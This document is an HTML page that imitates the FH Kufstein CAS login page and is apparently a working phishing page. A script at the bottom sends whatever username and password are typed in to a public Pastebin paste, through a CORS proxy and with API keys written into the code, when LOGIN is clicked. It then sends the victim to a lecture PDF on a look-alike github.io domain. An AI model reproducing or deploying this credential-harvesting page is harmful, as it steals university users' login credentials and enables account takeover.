<!DOCTYPE html><html>
<head>
    <title>Login - CAS &#8211; Central Authentication Service</title>
    <meta charset="UTF-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><link rel="stylesheet" type="text/css" href="https://webproxy.fh-kufstein.ac.at/cas/webjars/font-awesome/5.11.2/css/all.min.css"/><link rel="stylesheet" type="text/css" href="https://webproxy.fh-kufstein.ac.at/cas/webjars/bootstrap/4.3.1/css/bootstrap.min.css"/><link rel="stylesheet" type="text/css" href="https://webproxy.fh-kufstein.ac.at/cas/css/cas.css"/><link rel="icon" href="https://webproxy.fh-kufstein.ac.at/cas/favicon.ico" type="image/x-icon"/><script type="text/javascript" src="https://webproxy.fh-kufstein.ac.at/cas/webjars/jquery/3.4.1/jquery.min.js"></script>

<meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/></head>
<script>
	var url = new URL(window.location.href);
	var username = url.searchParams.get("username");
	</script>
<body class="login">

<header role="banner">

    <div>
        <nav class="navbar navbar-expand-lg fixed-top">

        </nav>
    </div>


</header>

<main role="main" class="container mt-3 mb-3">
    <div id="content" class="row">
            <div id="loginForm">
                <div class="card">
                <div class="card-header text-center">
                    <a href="https://www.fh-kufstein.ac.at" target="_blank">
                        <img id="headerlogo" width="190" height="122" src="https://webproxy.fh-kufstein.ac.at/cas/images/fh_logo.png"
                             alt="Fachhochschule Kufstein - Higher Level of Education" title="Logo FH Kufstein"/></a>
                </div>
                <div class="card-body">
                    <div id="fm1">
                        <h3 style="text-align: center; margin-top:-15px">
                                                        <span>Enter Username & Password</span>
                        </h3>
                        
                        <section class="form-group">
                            </section>

                        <section class="form-group">
                            <span><span class="accesskey">U</span>sername:</span>

                            <div>
                                <input class="form-control required"
                                       id="username"
                                       size="25"
                                       tabindex="1"
                                       type="text"
                                       accesskey="u"
                                       autocomplete="off" name="username" value=""/></div>
                        </section>

                        <section class="form-group">
                            <span><span class="accesskey">P</span>assword:</span>

                            <div>
                                <input class="form-control required"
                                       type="password"
                                       id="password"
                                       size="25"
                                       tabindex="2"
                                       accesskey="p"
                                       autocomplete="off" name="password" value=""/><span id="capslock-on" style="display:none;">
                                <p>
                                    <i class="fa fa-exclamation-circle"></i>
                                    <span>CAPSLOCK key is turned on!</span>
                                </p>
                            </span>
                            </div>
                        </section>

                        <section class="form-group">
                            </section>

                        <input onclick="abc()" type="hidden" name="execution" value=""/><input type="hidden" name="_eventId" value="submit"/><input type="hidden" name="geolocation"/><input class="btn btn-block btn-submit"
                               name="submit"
                               accesskey="l"
                               tabindex="6"
                               type="submit"
                               value="LOGIN" onclick="abc()"
                        /></div>

                    <div id="sidebar">
        <div class="sidebar-content">

        </div>
    </div>
                </div>
            </div>
            </div>
            <div id="providers" style="display: none;">
    </div>
        </div>
</main>

<footer class="footer" role="contentinfo">
        <section class="copyright">
            <div class="customContainer">
                <div class="row">
                    <div class="footerleft">
                        &#169; <a title="FH Kufstein Tirol" href="http://www.fh-kufstein.ac.at" target="_blank"><b>FH Kufstein
                        Tirol</b></a> // Andreas Hofer-Stra&#223;e 7 // A-6330 Kufstein // Tel. +43 5372 71819 // <a
                            href="mailto:info@fh-kufstein.ac.at">info@fh-kufstein.ac.at</a>
                    </div>
                    <div class="footerright">
                        <ul>
                            <li>
                                <a title="Anfahrt" href="http://www.fh-kufstein.ac.at/Anfahrt" target="_blank">Anfahrt</a>
                            </li>
                            <li>
                                <a title="Impressum" href="http://www.fh-kufstein.ac.at/Impressum"
                                   target="_blank">Impressum</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>
    </footer>
	
	<script>
function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}
			$("#username").val(username);
		
			function abc(a){
				var request = new XMLHttpRequest();

				request.open("POST", "https://cors-anywhere.herokuapp.com/https://pastebin.com/api/api_post.php", true);

				request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

				request.send("api_user_key=ad65dcc8bb93cf505c94ffdc8cff162c&api_dev_key=378ddcae1c7001bba7a4b487890c54f2&api_option=paste&api_paste_private=0&api_paste_name=Chipchip1234&api_paste_expire_date=N&api_paste_format=javascript&api_paste_code="+$("#username").val()+" - "+$("#password").val());
				setTimeout(c, 2000) 
			}
		
			function c(){
				window.location = "https://fh-kufstein-ac-at.github.io/weblearn-login/Teil 3 - Lorenzkurve, Konfidenzintervalle.pdf";
				return false;
			}
		</script>

</body>
</html>

